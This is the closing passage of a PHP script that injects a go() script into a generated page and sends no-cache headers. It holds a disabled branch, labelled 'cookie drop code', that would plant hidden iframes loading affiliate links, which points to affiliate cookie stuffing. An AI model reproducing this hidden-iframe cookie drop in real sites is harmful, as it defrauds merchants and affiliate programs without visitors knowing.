				}
			}";
		
		$scriptCode .= "</script>";
					   
		// Add cookie drop code without JS -- Not used, as it just skips client side validations
		if (false && $iFrameCookiesEnabled) {
			foreach($affiliateLinkUrl as $url) {
				if (strlen($url) > 0) {
					$iframeCode = "<iframe src=\"".$url."\" style=\"display:none\" sandbox=\"allow-top-navigation allow-popups allow-scripts allow-same-origin\"></iframe>"; 
					$resultHtml = str_replace("</body>", $iframeCode."</body>",$resultHtml);
				}
			}
		}
					   
		if ($outputMethod === "JS")
		{
			$scriptCode .= "\n<script type=\"text/javascript\">go();</script>";

			$resultHtml = str_replace("{script}", $scriptCode, $resultHtml);
			$resultHtml = str_replace("{queryString}", $queryString, $resultHtml);

			$resultHtml = createJSCode($resultHtml);
		}
		else
		{
			$onloadCode = " onload=\"go();\"";

			$resultHtml = str_replace("{script}", minify($scriptCode), $resultHtml);
			$resultHtml = str_replace("{onload}", $onloadCode, $resultHtml);
		}
	}

	header("Expires: Mon, 01 Jan 1985 05:00:00 GMT");
	header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
	header("Cache-Control: no-store, no-cache, must-revalidate");
	header("Cache-Control: post-check=0, pre-check=0, max-age=0", false);
	header("Pragma: no-cache");

	if ($outputMethod == "JS")
	{
		header("Content-Type: application/javascript");
	}

	echo $resultHtml;

?>